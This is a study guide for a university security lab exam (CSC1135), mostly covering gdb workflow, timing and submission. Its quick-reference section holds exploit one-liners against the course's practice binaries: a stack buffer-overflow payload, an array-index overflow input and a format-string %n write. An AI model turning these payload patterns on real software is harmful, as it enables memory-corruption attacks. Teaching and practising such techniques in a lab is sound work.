# CSC1135 Lab Exam Preparation Summary

This directory contains all the resources you need to prepare for and successfully complete the CSC1135 lab exam.

## Files Created

### 1. `exam_template.txt`
A ready-to-use template for the exam file with:
- Proper header structure with separators
- Placeholder sections for all question types
- Correct formatting (answer markers, question numbering)
- Lockbox URL placeholders

**Usage:** Copy this template when you start the exam, fill in the lockbox URL and your details, then work through questions.

### 2. `exam_workflow.md`
Comprehensive step-by-step workflow guide including:
- Pre-exam preparation checklist
- Detailed time allocation (100 minutes broken down)
- Phase-by-phase workflow (Setup → Scan → Section A → Section B → Review)
- Save strategy and reminders
- Answer format guidelines
- Common pitfalls to avoid
- Emergency procedures

**Usage:** Read this before the exam to understand the workflow, then use as reference during the exam.

### 3. `gdb_exam_cheatsheet.md`
Complete quick reference for:
- All essential gdb commands organized by category
- Question-type-specific workflows (Stack analysis, Buffer overflow, Array overflow, Format string, Stack protection)
- Perl command syntax for exploits
- Common patterns and calculations
- Tips and best practices

**Usage:** Print this or keep it open during practice. Familiarize yourself with commands before the exam.

## Quick Start Guide

### Before the Exam

1. **Read the rules** (`rules.txt` or `rules.pdf`)
   - Understand the format and requirements
   - Note the 100-minute time limit
   - Understand lockbox submission procedure

2. **Practice with sample exam** (`sample_1/exam.txt`)
   - Complete it under timed conditions
   - Use `gdb_exam_cheatsheet.md` as reference
   - Practice the workflow from `exam_workflow.md`

3. **Test lockbox upload**
   - Upload your sample exam solution
   - Verify your DCU credentials work
   - Understand the upload interface

4. **Familiarize yourself with files**
   - Review `exam_template.txt` structure
   - Study `gdb_exam_cheatsheet.md` commands
   - Understand `exam_workflow.md` time allocation

### During the Exam

1. **First 2 minutes:**
   - Open `labexam/exam.txt`
   - Fill in name and student number
   - Copy lockbox URL
   - **SAVE THE FILE**

2. **Next 5 minutes:**
   - Read all questions
   - Identify easiest/hardest questions
   - Plan your approach

3. **Section A (40 minutes):**
   - Work through stack analysis questions
   - Use gdb commands from cheatsheet
   - Save after each sub-question

4. **Section B (60 minutes):**
   - Work through exploit questions
   - Follow question-type workflows from cheatsheet
   - Save after each question

5. **Final 3 minutes:**
   - Review all answers
   - Verify formatting
   - Upload to lockbox
   - Confirm upload success

## Key Strategies

### Formatting
- Always use `* Answer:` prefix
- Preserve all separators (`=====`, `---`)
- Include gdb commands/outputs when helpful
- Follow question numbering exactly

### Time Management
- **Section A:** 40 minutes (40 marks)
- **Section B:** 60 minutes (60 marks)
- **Review/Upload:** 3 minutes
- Move on if stuck, return later

### Save Strategy
- Save after every answer
- Save every 5-10 minutes
- Save before running exploits
- Save before uploading

### Answer Strategy
- Even partial answers are better than blank
- Show work/commands for partial credit
- Use clear, concise language
- Leave placeholders for difficult questions

## Question Type Quick Reference

### Stack Analysis (Section A)
- Use `info frame` for saved eip/ebp
- Use `info stack` for frame count
- Use `p/d addr1 - addr2` for offsets
- Use `disassemble` for assembly
- Use `x/3bx function` for byte encoding

### Buffer Overflow (q2)
- Find address: `disassemble main`
- Test offset: `perl -e 'system "./q2", "A"xN . "BBBB"'`
- Exploit: `perl -e 'system "./q2", "A"x38 . "\xee\x83\x04\x08"'`

### Array Overflow (q3)
- Find addresses: `print &foo`, `print &values`
- Calculate index: `p/d (return_addr - values_addr)/4`
- Exploit: `perl -e 'print "515 134513494\n-1 1\n"' | ./q3`

### Format String (q4)
- Find address: `print &rating`
- Find position: Test with `"AAAA" . "%x%x%x%x%x"`
- Exploit: `perl -e 'system "./q4", pack("V", 0x804b018) . "%995d%5$n"'`

### Stack Protection (q5)
- Compare: `gdb ./safe` vs `gdb ./unsafe`
- Use `info frame` to see layouts
- Find canary: `x/x $ebp-4`

## Critical Reminders

1. ✅ **Save frequently** - Every 5-10 minutes minimum
2. ✅ **Answer format** - Always use `* Answer:` prefix
3. ✅ **Lockbox upload** - Test before exam, upload with 5+ minutes remaining
4. ✅ **File location** - Work in `labexam/exam.txt` (don't create new files)
5. ✅ **Show work** - Include gdb commands/outputs for partial credit
6. ✅ **Time management** - Don't get stuck on one question
7. ✅ **Name/Student number** - Fill these in first!
8. ✅ **Verify upload** - Confirm upload was successful

## Practice Recommendations

1. **Complete sample exam** under timed conditions (100 minutes)
2. **Practice gdb commands** until they're second nature
3. **Memorize common patterns** (offset calculations, address conversions)
4. **Test lockbox upload** procedure multiple times
5. **Review workflow** until you can execute it smoothly

## File Structure

```
Sample_Labs/
├── exam_template.txt           # Template for exam file
├── exam_workflow.md            # Detailed workflow guide
├── gdb_exam_cheatsheet.md      # GDB commands reference
├── EXAM_PREPARATION_SUMMARY.md # This file
├── rules.txt                   # Exam rules
├── sample_1/                   # Sample exam files
│   ├── exam.txt               # Sample exam (completed)
│   ├── q1, q2, q3, q4        # Executables
│   └── q1.c, q2.c, etc.      # Source code
└── cheatsheet.md              # Additional reference (if needed)
```

## Success Checklist

Before exam day:
- [ ] Read and understood exam rules
- [ ] Completed sample exam under timed conditions
- [ ] Tested lockbox upload procedure
- [ ] Familiar with gdb commands from cheatsheet
- [ ] Understand workflow and time allocation
- [ ] Reviewed exam template structure

During exam:
- [ ] Filled name and student number immediately
- [ ] Saved file after every answer
- [ ] All questions attempted (even if partial)
- [ ] File uploaded to lockbox successfully
- [ ] Upload confirmed with time remaining

Good luck with your exam! You've got this! 🎓

